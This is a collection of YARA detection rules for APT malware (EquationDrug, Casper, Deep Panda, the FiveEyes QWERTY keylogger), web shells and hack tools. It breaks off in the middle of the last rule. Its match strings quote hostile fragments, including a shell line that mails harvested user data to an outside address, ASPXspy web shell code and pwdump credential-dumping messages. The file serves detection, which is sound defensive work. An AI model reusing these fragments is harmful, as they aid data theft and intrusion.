rule EquationDrug_Keylogger_RID2FF1 : APT DEMO T1056 T1136 {
   meta:
      description = "EquationDrug - Key/clipboard logger driver - msrtvd.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 12:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
      $s2 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\En" wide
      $s3 = "\\DosDevices\\Gk" fullword wide
      $s5 = "\\Device\\Gk0" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_NetworkSniffer4_RID3233 : APT DEMO T1040 T1136 {
   meta:
      description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:55:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Copyright 1999 RAVISENT Technologies Inc." fullword wide
      $s1 = "\\systemroot\\" fullword ascii
      $s2 = "RAVISENT Technologies Inc." fullword wide
      $s3 = "Created by VIONA Development" fullword wide
      $s4 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s5 = "\\device\\harddiskvolume" fullword wide
      $s7 = "ATMDKDRV.SYS" fullword wide
      $s8 = "\\Device\\%ws_%ws" fullword wide
      $s9 = "\\DosDevices\\%ws" fullword wide
      $s10 = "CineMaster C 1.1 WDM Main Driver" fullword wide
      $s11 = "\\Device\\%ws" fullword wide
      $s13 = "CineMaster C 1.1 WDM" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_PlatformOrchestrator_RID348D : APT DEMO T1136 {
   meta:
      description = "EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 15:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SERVICES.EXE" fullword wide
      $s1 = "\\command.com" fullword wide
      $s2 = "Microsoft(R) Windows (TM) Operating System" fullword wide
      $s3 = "LSASS.EXE" fullword wide
      $s4 = "Windows Configuration Services" fullword wide
      $s8 = "unilay.dll" fullword ascii
   condition: 
      all of them
} 

rule EquationDrug_NetworkSniffer5_RID3234 : APT DEMO T1040 T1136 {
   meta:
      description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
      $s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s2 = "atmdkdrv.sys" fullword wide
      $s4 = "\\Device\\%ws_%ws" fullword wide
      $s5 = "\\DosDevices\\%ws" fullword wide
      $s6 = "\\Device\\%ws" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_FileSystem_Filter_RID3312 : APT DEMO T1136 {
   meta:
      description = "EquationDrug - Filesystem filter driver volrec.sys, scsi2mgr.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 14:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "volrec.sys" fullword wide
      $s1 = "volrec.pdb" fullword ascii
      $s2 = "Volume recognizer driver" fullword wide
   condition: 
      all of them
} 

rule Casper_Included_Strings_RID303F : APT DEMO EXE FILE T1082 T1136 {
   meta:
      description = "Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo"
      author = "Florian Roth"
      reference = "http://goo.gl/VRJNLo"
      date = "2015-03-06 12:31:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1082, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a0 = "cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST" 
      $a1 = "& SYSTEMINFO) ELSE EXIT" 
      $c1 = "domcommon.exe" wide fullword
      $c2 = "jpic.gov.sy" fullword
      $c3 = "aiomgr.exe" wide fullword
      $c4 = "perfaudio.dat" fullword
      $c5 = "Casper_DLL.dll" fullword
      $c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 } 
      $c7 = "{4216567A-4512-9825-7745F856}" fullword
   condition: 
      all of ( $a* ) or ( uint16 ( 0 ) == 0x5a4d and 1 of ( $c* ) )
} 

rule Casper_SystemInformation_Output_RID33C9 : APT DEMO T1136 {
   meta:
      description = "Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo"
      author = "Florian Roth"
      reference = "http://goo.gl/VRJNLo"
      date = "2015-03-06 15:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a0 = "***** SYSTEM INFORMATION ******" 
      $a1 = "***** SECURITY INFORMATION ******" 
      $a2 = "Antivirus: " 
      $a3 = "Firewall: " 
      $a4 = "***** EXECUTION CONTEXT ******" 
      $a5 = "Identity: " 
      $a6 = "<CONFIG TIMESTAMP=" 
   condition: 
      all of them
} 

rule Casper_Backdoor_x86_RID2E38 : APT DEMO MAL T1090 T1136 {
   meta:
      description = "Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo"
      author = "Florian Roth"
      reference = "http://goo.gl/VRJNLo"
      date = "2015-03-05 11:05:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MAL, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"svchost.exe\"" fullword wide
      $s2 = "firefox.exe" fullword ascii
      $s3 = "\"Host Process for Windows Services\"" fullword wide
      $x1 = "\\Users\\*" fullword ascii
      $x2 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
      $x3 = "\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
      $x4 = "\\Documents and Settings\\*" fullword ascii
      $y1 = "%s; %S=%S" fullword wide
      $y2 = "%s; %s=%s" fullword ascii
      $y3 = "Cookie: %s=%s" fullword ascii
      $y4 = "http://%S:%d" fullword wide
      $z1 = "http://google.com/" fullword ascii
      $z2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii
      $z3 = "Operating System\"" fullword wide
   condition: 
      ( filesize < 250KB and all of ( $s* ) ) or ( 3 of ( $x* ) and 2 of ( $y* ) and 2 of ( $z* ) )
} 

rule Casper_EXE_Dropper_RID2DEB : APT DEMO MAL T1090 T1136 {
   meta:
      description = "Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo"
      author = "Florian Roth"
      reference = "http://goo.gl/VRJNLo"
      date = "2015-03-05 10:52:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MAL, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<Command>" fullword ascii
      $s1 = "</Command>" fullword ascii
      $s2 = "\" /d \"" fullword ascii
      $s4 = "'%s' %s" fullword ascii
      $s5 = "nKERNEL32.DLL" fullword wide
      $s6 = "@ReturnValue" fullword wide
      $s7 = "ID: 0x%x" fullword ascii
      $s8 = "Name: %S" fullword ascii
   condition: 
      7 of them
} 

rule Equation_Kaspersky_GreyFishInstaller_RID35A1 : APT DEMO G0020 T1136 {
   meta:
      description = "Equation Group Malware - Grey Fish"
      author = "Florian Roth"
      reference = "http://goo.gl/ivt8EW"
      date = "2015-02-16 16:21:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0020, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "DOGROUND.exe" fullword wide
      $s1 = "Windows Configuration Services" fullword wide
      $s2 = "GetMappedFilenameW" fullword ascii
   condition: 
      all of them
} 

rule Dexter_Malware_RID2CA5 : DEMO MAL T1136 {
   meta:
      description = "Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b"
      author = "Florian Roth"
      reference = "http://goo.gl/oBvy8b"
      date = "2015-02-10 09:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Java Security Plugin" fullword wide
      $s1 = "%s\\%s\\%s.exe" fullword wide
      $s2 = "Sun Java Security Plugin" fullword wide
      $s3 = "\\Internet Explorer\\iexplore.exe" fullword wide
   condition: 
      all of them
} 

rule Enfal_Malware_RID2C1F : DEMO MAL T1136 {
   meta:
      description = "Detects a certain type of Enfal Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-02-10 09:35:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "POWERPNT.exe" fullword ascii
      $s1 = "%APPDATA%\\Microsoft\\Windows\\" fullword ascii
      $s2 = "%HOMEPATH%" fullword ascii
      $s3 = "Server2008" fullword ascii
      $s4 = "Server2003" fullword ascii
      $s5 = "Server2003R2" fullword ascii
      $s6 = "Server2008R2" fullword ascii
      $s9 = "%HOMEDRIVE%" fullword ascii
      $s13 = "%ComSpec%" fullword ascii
   condition: 
      all of them
} 

rule DeepPanda_sl_txt_packed_RID3037 : APT DEMO G0009 T1045 T1136 {
   meta:
      description = "Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - ScanLine sl-txt-packed"
      author = "Florian Roth"
      reference = "http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf"
      date = "2015-02-08 12:30:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0009, T1045, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Command line port scanner" fullword wide
      $s1 = "sl.exe" fullword wide
      $s2 = "CPports.txt" fullword ascii
      $s3 = ",GET / HTTP/.}" fullword ascii
      $s4 = "Foundstone Inc." fullword wide
      $s9 = " 2002 Foundstone Inc." fullword wide
      $s15 = ", Inc. 2002" fullword ascii
      $s20 = "ICMP Time" fullword ascii
   condition: 
      all of them
} 

rule DeepPanda_lot1_RID2C52 : APT DEMO G0009 T1003 T1136 {
   meta:
      description = "Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - lot1.tmp-pwdump"
      author = "Florian Roth"
      reference = "http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf"
      date = "2015-02-08 09:44:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0009, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Unable to open target process: %d, pid %d" fullword ascii
      $s1 = "Couldn't delete target executable from remote machine: %d" fullword ascii
      $s2 = "Target: Failed to load SAM functions." fullword ascii
      $s5 = "Error writing the test file %s, skipping this share" fullword ascii
      $s6 = "Failed to create service (%s/%s), error %d" fullword ascii
      $s8 = "Service start failed: %d (%s/%s)" fullword ascii
      $s12 = "PwDump.exe" fullword ascii
      $s13 = "GetAvailableWriteableShare returned an error of %ld" fullword ascii
      $s14 = ":\\\\.\\pipe\\%s" fullword ascii
      $s15 = "Couldn't copy %s to destination %s. (Error %d)" fullword ascii
      $s16 = "dump logon session" fullword ascii
      $s17 = "Timed out waiting to get our pipe back" fullword ascii
      $s19 = "SetNamedPipeHandleState failed, error %d" fullword ascii
      $s20 = "%s\\%s.exe" fullword ascii
   condition: 
      10 of them
} 

rule DeepPanda_htran_exe_RID2E90 : APT DEMO G0009 T1020 T1090 T1136 {
   meta:
      description = "Hack Deep Panda - htran-exe"
      author = "Florian Roth"
      reference = "-"
      date = "2015-02-08 11:19:51"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0009, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
      $s2 = "\\Release\\htran.pdb" ascii
      $s3 = "[SERVER]connection to %s:%d error" fullword ascii
      $s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s8 = "======================== htran V%s =======================" fullword ascii
      $s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s15 = "[+] OK! I Closed The Two Socket." fullword ascii
      $s20 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
   condition: 
      1 of them
} 

rule DeepPanda_Trojan_Kakfum_RID2FFE : APT DEMO G0009 MAL T1136 {
   meta:
      description = "Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - Trojan.Kakfum sqlsrv32.dll"
      author = "Florian Roth"
      reference = "http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf"
      date = "2015-02-08 12:20:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0009, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%SystemRoot%\\System32\\svchost.exe -k sqlserver" fullword ascii
      $s1 = "%s\\sqlsrv32.dll" fullword ascii
      $s2 = "%s\\sqlsrv64.dll" fullword ascii
      $s3 = "%s\\%d.tmp" fullword ascii
      $s4 = "ServiceMaix" fullword ascii
      $s15 = "sqlserver" fullword ascii
   condition: 
      all of them
} 

rule ASPXspy2_RID29DB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shell - file ASPXspy2_RID29DB.aspx"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-24 01:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s3 = "Process[] p=Process.GetProcesses();" fullword ascii
      $s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
      $s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
      $s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
      $s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
      $s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
      $s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
      $s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
      $s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
      $s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
      $s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
   condition: 
      6 of them
} 

rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL T1136 {
   meta:
      description = "Linux hack tools - file a"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-19 11:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "mv scan.log bios.txt" fullword ascii
      $s2 = "rm -rf bios.txt" fullword ascii
      $s3 = "echo -e \"# by Eyes.\"" fullword ascii
      $s4 = "././pscan2 $1 22" fullword ascii
      $s10 = "echo \"#cautam...\"" fullword ascii
   condition: 
      2 of them
} 

rule FiveEyes_QUERTY_Malwaresig_20121_dll_RID33D5 : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20121.dll.bin"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WarriorPride\\production2.0\\package\\E_Wzowski" ascii
      $s1 = "20121.dll" fullword ascii
   condition: 
      all of them
} 

rule FiveEyes_QUERTY_Malwareqwerty_20121_RID33A3 : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20121.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 14:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<configFileName>20121_cmdDef.xml</configFileName>" fullword ascii
      $s1 = "<name>20121.dll</name>" fullword ascii
      $s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
      $s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
      $s4 = "<platform type=\"1\">" fullword ascii
      $s5 = "</plugin>" fullword ascii
      $s6 = "</pluginConfig>" fullword ascii
      $s7 = "<pluginConfig>" fullword ascii
      $s8 = "</platform>" fullword ascii
      $s9 = "</lpConfig>" fullword ascii
      $s10 = "<lpConfig>" fullword ascii
   condition: 
      9 of them
} 

rule FiveEyes_QUERTY_Malwaresig_20123_sys_RID33FA : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20123.sys.bin"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "20123.dll" fullword ascii
      $s1 = "kbdclass.sys" fullword wide
      $s2 = "IoFreeMdl" fullword ascii
      $s3 = "ntoskrnl.exe" fullword ascii
      $s4 = "KfReleaseSpinLock" fullword ascii
   condition: 
      all of them
} 

rule FiveEyes_QUERTY_Malwaresig_20123_cmdDef_RID34DE : APT DEMO T1136 T1220 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20123_cmdDef.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136, T1220"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<shortDescription>Keystroke Collector</shortDescription>" fullword ascii
      $s1 = "This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>" fullword ascii
      $s2 = "<commands/>" fullword ascii
      $s3 = "</version>" fullword ascii
      $s4 = "<associatedImplantId>20121</associatedImplantId>" fullword ascii
      $s5 = "<rightsRequired>System or Administrator (if Administrator, I think the DriverIns" ascii
      $s6 = "<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64" ascii
      $s7 = "<projectpath>plugin/Collection</projectpath>" fullword ascii
      $s8 = "<dllDepend>None</dllDepend>" fullword ascii
      $s9 = "<minorType>0</minorType>" fullword ascii
      $s10 = "<pluginname>E_QwertyKM</pluginname>" fullword ascii
      $s11 = "</comments>" fullword ascii
      $s12 = "<comments>" fullword ascii
      $s13 = "<majorType>1</majorType>" fullword ascii
      $s14 = "<files>None</files>" fullword ascii
      $s15 = "<poc>Erebus</poc>" fullword ascii
      $s16 = "</plugin>" fullword ascii
      $s17 = "<team>None</team>" fullword ascii
      $s18 = "<?xml-stylesheet type=\"text/xsl\" href=\"../XSLT/pluginHTML.xsl\"?>" fullword ascii
      $s19 = "<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>" fullword ascii
      $s20 = "<plugin id=\"20123\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi" ascii
   condition: 
      14 of them
} 

rule FiveEyes_QUERTY_Malwareqwerty_20123_RID33A5 : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20123.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 14:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -" ascii
      $s1 = "<configFileName>20123_cmdDef.xml</configFileName>" fullword ascii
      $s2 = "<name>20123.sys</name>" fullword ascii
      $s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
      $s4 = "<codebase>/bin/i686-pc-win32/debug</codebase>" fullword ascii
      $s5 = "<platform type=\"1\">" fullword ascii
      $s6 = "</plugin>" fullword ascii
      $s7 = "</pluginConfig>" fullword ascii
      $s8 = "<pluginConfig>" fullword ascii
      $s9 = "</platform>" fullword ascii
      $s10 = "</lpConfig>" fullword ascii
      $s11 = "<lpConfig>" fullword ascii
   condition: 
      9 of them
} 

rule FiveEyes_QUERTY_Malwaresig_20120_dll_RID33D4 : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20120.dll.bin"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:04:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt" fullword wide
      $s1 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml" fullword wide
      $s2 = "Failed to send the EQwerty_driverStatusCommand to the implant." fullword ascii
      $s3 = "- Log Used (number of windows) - %d" fullword wide
      $s4 = "- Log Limit (number of windows) - %d" fullword wide
      $s5 = "Process or User Default Language" fullword wide
      $s6 = "Windows 98/Me, Windows NT 4.0 and later: Vietnamese" fullword wide
      $s7 = "- Logging of keystrokes is switched ON" fullword wide
      $s8 = "- Logging of keystrokes is switched OFF" fullword wide
      $s9 = "Qwerty is currently logging active windows with titles containing the fo" wide
      $s10 = "Windows 95, Windows NT 4.0 only: Korean (Johab)" fullword wide
      $s11 = "FAILED to get Qwerty Status" fullword wide
      $s12 = "- Successfully retrieved Log from Implant." fullword wide
      $s13 = "- Logging of all Windows is toggled ON" fullword wide
      $s14 = "- Logging of all Windows is toggled OFF" fullword wide
      $s15 = "Qwerty FAILED to retrieve window list." fullword wide
      $s16 = "- UNSUCCESSFUL Log Retrieval from Implant." fullword wide
      $s17 = "The implant failed to return a valid status" fullword ascii
      $s18 = "- Log files were NOT generated!" fullword wide
      $s19 = "Windows 2000/XP: Armenian. This is Unicode only." fullword wide
      $s20 = "- This machine is using a PS/2 Keyboard - Continue on using QWERTY" fullword wide
   condition: 
      10 of them
} 

rule FiveEyes_QUERTY_Malwaresig_20120_cmdDef_RID34DB : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20120_cmdDef.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "This PPC gets the current keystroke log." fullword ascii
      $s1 = "This command will add the given WindowTitle to the list of Windows to log keys f" ascii
      $s2 = "This command will remove the WindowTitle corresponding to the given window title" ascii
      $s3 = "This command will return the current status of the Keyboard Logger (Whether it i" ascii
      $s4 = "This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w" ascii
      $s5 = "<definition>Turn logging of all keys on|off</definition>" fullword ascii
      $s6 = "<name>Get Keystroke Log</name>" fullword ascii
      $s7 = "<description>Keystroke Logger Lp Plugin</description>" fullword ascii
      $s8 = "<definition>display help for this function</definition>" fullword ascii
      $s9 = "This command will switch ON Logging of keys. All keys taht are entered to a acti" ascii
      $s10 = "Set the log limit (in number of windows)" fullword ascii
      $s11 = "<example>qwgetlog</example>" fullword ascii
      $s12 = "<aliasName>qwgetlog</aliasName>" fullword ascii
      $s13 = "<definition>The title of the Window whose keys you wish to Log once it becomes a" ascii
      $s14 = "This command will switch OFF Logging of keys. No keystrokes will be captured" fullword ascii
      $s15 = "<definition>The title of the Window whose keys you no longer whish to log</defin" ascii
      $s16 = "<command id=\"32\">" fullword ascii
      $s17 = "<command id=\"3\">" fullword ascii
      $s18 = "<command id=\"7\">" fullword ascii
      $s19 = "<command id=\"1\">" fullword ascii
      $s20 = "<command id=\"4\">" fullword ascii
   condition: 
      10 of them
} 

rule FiveEyes_QUERTY_Malwareqwerty_20120_RID33A2 : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20120.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 14:56:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<configFileName>20120_cmdDef.xml</configFileName>" fullword ascii
      $s1 = "<name>20120.dll</name>" fullword ascii
      $s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
      $s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
      $s4 = "<platform type=\"1\">" fullword ascii
      $s5 = "</plugin>" fullword ascii
      $s6 = "</pluginConfig>" fullword ascii
      $s7 = "<pluginConfig>" fullword ascii
      $s8 = "</platform>" fullword ascii
      $s9 = "</lpConfig>" fullword ascii
      $s10 = "<lpConfig>" fullword ascii
   condition: 
      all of them
} 

rule FiveEyes_QUERTY_Malwaresig_20121_cmdDef_RID34DC : APT DEMO T1136 {
   meta:
      description = "FiveEyes QUERTY Malware - file 20121_cmdDef.xml"
      author = "Florian Roth"
      reference = "http://www.spiegel.de/media/media-35668.pdf"
      date = "2015-01-18 15:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<shortDescription>Keystroke Logger Plugin.</shortDescription>" fullword ascii
      $s1 = "<message>Failed to get File Time</message>" fullword ascii
      $s2 = "<description>Keystroke Logger Plugin.</description>" fullword ascii
      $s3 = "<message>Failed to set File Time</message>" fullword ascii
      $s4 = "</commands>" fullword ascii
      $s5 = "<commands>" fullword ascii
      $s6 = "</version>" fullword ascii
      $s7 = "<associatedImplantId>20120</associatedImplantId>" fullword ascii
      $s8 = "<message>No Comms. with Driver</message>" fullword ascii
      $s9 = "</error>" fullword ascii
      $s10 = "<message>Invalid File Size</message>" fullword ascii
      $s11 = "<platforms>Windows (User/Win32)</platforms>" fullword ascii
      $s12 = "<message>File Size Mismatch</message>" fullword ascii
      $s13 = "<projectpath>plugin/Utility</projectpath>" fullword ascii
      $s14 = "<pluginsDepend>None</pluginsDepend>" fullword ascii
      $s15 = "<dllDepend>None</dllDepend>" fullword ascii
      $s16 = "<pluginname>E_QwertyIM</pluginname>" fullword ascii
      $s17 = "<rightsRequired>None</rightsRequired>" fullword ascii
      $s18 = "<minorType>0</minorType>" fullword ascii
      $s19 = "<code>00001002</code>" fullword ascii
      $s20 = "<code>00001001</code>" fullword ascii
   condition: 
      12 of them
} 

rule Pastebin_Webshell_RID2DDC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
      author = "Florian Roth"
      reference = "http://goo.gl/7dbyZs"
      date = "2015-01-13 10:49:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
